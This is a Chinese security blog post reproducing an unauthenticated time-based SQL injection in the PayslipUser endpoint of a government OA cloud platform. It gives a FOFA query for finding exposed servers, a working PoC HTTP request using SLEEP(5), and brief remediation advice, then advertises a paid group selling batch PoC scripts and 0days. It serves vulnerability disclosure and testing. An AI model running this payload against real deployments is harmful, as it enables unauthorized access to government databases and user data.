#  「漏洞复现」数字通云平台 智慧政务OA PayslipUser SQL注入漏洞   
冷漠安全  冷漠安全   2024-07-20 11:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
数字通云平台智慧政务OA产品是基于云计算、大数据、人工智能等先进技术，为政府部门量身定制的智能化办公系统。该系统旨在提高政府部门的办公效率、协同能力和信息资源共享水平，推动电子政务向更高层次发展。  
  
0x03  
  
**漏洞威胁**  
  
数字通云平台 智慧政务OA PayslipUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="assets/8cca19ff/css/bootstrap-yii.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oXP4BgmM6ADHcfcuhpBuz2T0IZicVyEDgzWTMUicrpYka9TuNByeibWYqrcEuLKn66aWGmb8yGUJTQA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%285%29%29%29usQE%29 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
 延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oXP4BgmM6ADHcfcuhpBuz2rEV0lfSDQ4WqvPsaRrs7jVlGr5ibf7zVZgvgicWftQYX1XOHppuz4xrA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oXP4BgmM6ADHcfcuhpBuz2nExiaXER9yzDonLkDzxUopVibxSmfl2HOTp42pKZfjicV1B32j7Jk7hMw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
厂商已发布了漏洞修复程序，请及时关注更新：  
  
临时修复方案：  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oXP4BgmM6ADHcfcuhpBuz2cCbHkaE8pcv17dnvV15sK7qVwUYJ2VMHCXB3NBOo0NpvRcxejgIiavA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oXP4BgmM6ADHcfcuhpBuz2Y6ic733jnqKfNXtic30nCXTYDw4g3LqQLEJarbTvAw6FkD1qJjfibqQibA/640?wx_fmt=gif&from=appmsg "")  
  
  
